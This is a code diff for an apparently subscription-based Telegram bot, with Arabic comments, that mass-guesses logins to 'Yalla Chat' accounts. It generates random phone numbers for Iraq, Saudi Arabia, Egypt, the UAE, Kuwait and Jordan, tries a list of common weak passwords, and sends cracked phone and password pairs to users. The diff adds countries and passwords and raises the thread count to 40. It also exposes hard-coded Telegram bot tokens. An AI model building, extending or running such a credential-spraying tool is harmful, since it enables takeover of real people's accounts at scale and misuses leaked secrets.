@@ -4,7 +4,6 @@ import hmac as _hmac
 import json
 import os
 import random
-import sys
 import time
 import uuid
 import threading
@@ -16,7 +15,7 @@ import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 # ==================== إعدادات التلغرام (معرفاتك والتوكن) ====================
-BOT_TOKEN = "8844579780:AAF8oAN9eRfUK72kZL6e2BQJYYDj_06ZzAg"  # التوكن الجديد
+BOT_TOKEN = "8208523854:AAEC7cas4osiqWh5h0RIerAxR5UA1NOMAm8"  # التوكن الجديد
 ADMIN_ID = 8795120325                                         # الآيدي الخاص بك (المطور)
 SUBS_FILE = "subscriptions.json"
 
@@ -60,12 +59,68 @@ CODES  = {
 }
 
 DEFAULT_PASSWORDS = [
+    'Aa123123123',
+    'Aa12312300',
+    'Aa10002000',
+    'Aa100200300',
+    'Aa100200',
+    'Aa10203040',
+    'Aa102030',
+    'As123123',
+    'Aa11223344',
     'Aa123456',
     'Aa12345678',
-    'Aa12312300',
-    'Aa123123',
-    'Aa11223300',
+    'Ali112233',
+    'Aa123456789',
+    'Ali100200',
+    'Ali20002000',
+    'Ahmed100200',
+    'Ahmad123123',
+    'qwer1234',
+    'qwer4321',
+    'q1w2e3r4',
+    '1q2w3e4r',
 ]
+
+# قائمة الدول المدعومة للفحص
+COUNTRIES = {
+    "iraq": {
+        "name": "العراق 🇮🇶",
+        "region": 964,
+        "prefixes": ["771", "770", "781", "777", "750", "751"],
+        "digits_count": 7
+    },
+    "ksa": {
+        "name": "السعودية 🇸🇦",
+        "region": 966,
+        "prefixes": ["50", "53", "55", "56", "54", "58", "59"],
+        "digits_count": 7
+    },
+    "egypt": {
+        "name": "مصر 🇪🇬",
+        "region": 20,
+        "prefixes": ["10", "11", "12", "15"],
+        "digits_count": 8
+    },
+    "uae": {
+        "name": "الإمارات 🇦🇪",
+        "region": 971,
+        "prefixes": ["50", "54", "56", "58"],
+        "digits_count": 7
+    },
+    "kuwait": {
+        "name": "الكويت 🇰🇼",
+        "region": 965,
+        "prefixes": ["9", "6", "5"],
+        "digits_count": 7
+    },
+    "jordan": {
+        "name": "الأردن 🇯🇴",
+        "region": 962,
+        "prefixes": ["79", "78", "77"],
+        "digits_count": 7
+    }
+}
 
 # دالة الجلسات لكل خيط لضمان السرعة ومنع تداخل الاتصالات
 thread_local = threading.local()
@@ -190,9 +245,11 @@ def _do_login(phone: str, pw: str, region: int = 964, timeout: int = 20) -> dict
     except Exception as e:
         return {"status": "ERROR", "message": str(e), "dev": {"name": dname, "model": model}}
 
-def generate_random_phone():
-    prefixes = ["771", "770", "781", "777"]
-    return random.choice(prefixes) + "".join([str(random.randint(0, 7)) for _ in range(7)])
+def generate_phone_for_country(country_key):
+    c_info = COUNTRIES[country_key]
+    prefix = random.choice(c_info["prefixes"])
+    digits = "".join([str(random.randint(0, 9)) for _ in range(c_info["digits_count"])])
+    return prefix + digits
 
 # ==================== واجهات الأزرار (Keyboards) ====================
 def get_main_keyboard(user_id: int) -> InlineKeyboardMarkup:
@@ -201,6 +258,15 @@ def get_main_keyboard(user_id: int) -> InlineKeyboardMarkup:
     markup.add(InlineKeyboardButton("تفاصيل الاشتراك", callback_data="my_sub"))
     if user_id == ADMIN_ID:
         markup.add(InlineKeyboardButton("اعدادات البوت", callback_data="admin_panel"))
+    return markup
+
+def get_countries_keyboard() -> InlineKeyboardMarkup:
+    markup = InlineKeyboardMarkup(row_width=2)
+    buttons = []
+    for code, data in COUNTRIES.items():
+        buttons.append(InlineKeyboardButton(data["name"], callback_data=f"choose_country_{code}"))
+    markup.add(*buttons)
+    markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="main_menu"))
     return markup
 
 def get_scanning_keyboard() -> InlineKeyboardMarkup:
@@ -270,12 +336,25 @@ def handle_callbacks(call):
             pass
 
     elif call.data == "start_scan":
+        text = "🌍 <b>اختر الدولة التي تريد فحص حساباتها:</b>"
+        try:
+            bot.edit_message_text(text, chat_id, message_id, reply_markup=get_countries_keyboard())
+        except Exception:
+            pass
+
+    elif call.data.startswith("choose_country_"):
+        country_key = call.data.replace("choose_country_", "")
+        if country_key not in COUNTRIES:
+            return
+
         if user_id in user_active_scans and user_active_scans[user_id].get("running"):
             try:
                 bot.answer_callback_query(call.id, "عملية الفحص تعمل لديك بالفعل!", show_alert=True)
             except Exception:
                 pass
             return
+
+        c_data = COUNTRIES[country_key]
 
         try:
             bot.delete_message(chat_id, message_id)
@@ -284,7 +363,7 @@ def handle_callbacks(call):
 
         scan_msg = bot.send_message(
             chat_id,
-            "<b>جاري فحص الحسابات</b>\n\n"
+            f"<b>جاري فحص حسابات ({c_data['name']})</b>\n\n"
             "تم صيد : 0\n"
             "غير مسجل : 0\n"
             "الاخطاء : 0",
@@ -297,6 +376,9 @@ def handle_callbacks(call):
             "valid": 0,
             "not_registered": 0,
             "error": 0,
+            "country_key": country_key,
+            "country_name": c_data["name"],
+            "region": c_data["region"],
             "message_id": scan_msg.message_id
         }
 
@@ -357,12 +439,17 @@ def handle_callbacks(call):
 
 # ==================== خيوط الفحص المعزولة للمستخدم ====================
 def run_user_scanner(user_id: int, chat_id: int, scan_msg_id: int):
-    region = 964
-    max_threads = 8  # عدد الخيوط لكل مستخدم لضمان السرعة
+    user_state = user_active_scans.get(user_id)
+    if not user_state:
+        return
+    region = user_state["region"]
+    country_key = user_state["country_key"]
+    country_name = user_state["country_name"]
+    max_threads = 40  # عدد الخيوط لكل مستخدم لضمان السرعة
 
     def worker():
         while user_id in user_active_scans and user_active_scans[user_id]["running"]:
-            phone = generate_random_phone()
+            phone = generate_phone_for_country(country_key)
             first_pw = DEFAULT_PASSWORDS[0]
             
             try:
@@ -390,9 +477,9 @@ def run_user_scanner(user_id: int, chat_id: int, scan_msg_id: int):
                     if user_id in user_active_scans:
                         user_active_scans[user_id]["valid"] += 1
                     
-                    # إرسال تنبيه الصيد للمستخدم مباشرة
+                    # إرسال تنبيه الصيد للمستخدم مباشرة مع اسم الدولة
                     alert_text = (
-                        f"<b>تم صيد حساب يلا شات</b>\n\n"
+                        f"<b>تم صيد حساب يلا شات ({country_name})</b>\n\n"
                         f"<b>Phone :</b> {phone}\n"
                         f"<b>Password :</b> {pw}\n"
                         f"By : @aboodriad"
@@ -419,10 +506,10 @@ def run_user_scanner(user_id: int, chat_id: int, scan_msg_id: int):
             e = state["error"]
 
             status_text = (
-                f"<b>جاري فحص الحسابات</b>\n\n"
+                f"<b>جاري فحص حسابات ({country_name})</b>\n\n"
                 f"تم صيد : {v}\n"
                 f"غير مسجل : {nr}\n"
-                f"الاخطاء : {e}",
+                f"الاخطاء : {e}"
             )
 
             if status_text != last_text:
@@ -472,7 +559,7 @@ def process_del_sub(message):
 
 # ==================== تشغيل البوت مع نظام منع التوقف (Auto-Reconnect) ====================
 if __name__ == "__main__":
-    print("🤖 LightKVD Telegram Bot is running with Auto-Reconnect & Isolated UIs...")
+    print("🤖 LightKVD Telegram Bot is running with Auto-Reconnect & Country Selector...")
     while True:
         try:
             bot.infinity_polling(skip_pending=True, timeout=60, long_polling_timeout=60)
